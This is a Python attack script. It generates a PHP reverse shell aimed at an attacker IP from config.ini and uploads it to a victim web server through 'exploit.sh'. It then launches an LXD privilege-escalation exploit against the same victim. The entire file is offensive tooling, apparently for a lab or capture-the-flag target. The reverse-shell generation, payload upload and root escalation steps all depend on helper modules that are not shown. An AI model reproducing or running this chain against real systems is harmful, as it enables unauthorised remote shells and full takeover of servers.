import os
import my_reverse_shell
from datetime import datetime
from configparser import ConfigParser 
from Privilege_Escalation_LXD import LXD_exploit

def exploit_LXD():
	config_object = ConfigParser()
	config_object.read("config.ini")
	attacker_info = config_object["ATTACKERINFO"]
	victim_info = config_object["VICTIMINFO"]
	general_info = config_object["GENERALINFO"]
	
	
	f = open("reverse_shell.php", "w")

	code = my_reverse_shell.gen_reverse_shell(attacker_info)

	f.write(code)

	f.close()

	print('[+] Reverse Shell generated')

	flag = False

		

	print('[*] Executing exploit')
	
	print('[*] Sending the payload...')
	launch_exploit(attacker_info, victim_info)
	user_dir = os.getcwd()
	print('[*] Proceeding to execute the reverse shell')
	#os.system("python3 {dir}/Privilege_Escalation_LXD/main.py {ip} {port} {v_ip} {v_port}".format(dir = user_dir, ip = attacker_info["ip"], port = attacker_info["port"], v_ip = victim_info['ip'], v_port = victim_info['port']))
	LXD_exploit.run(attacker_info["ip"], attacker_info["port"], victim_info['ip'], victim_info['port'])


def launch_exploit(attacker_info, victim_info):
	now = datetime.now()

	os.system('''bash exploit.sh -u http://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))

	print("[*] Checking if url was generated")
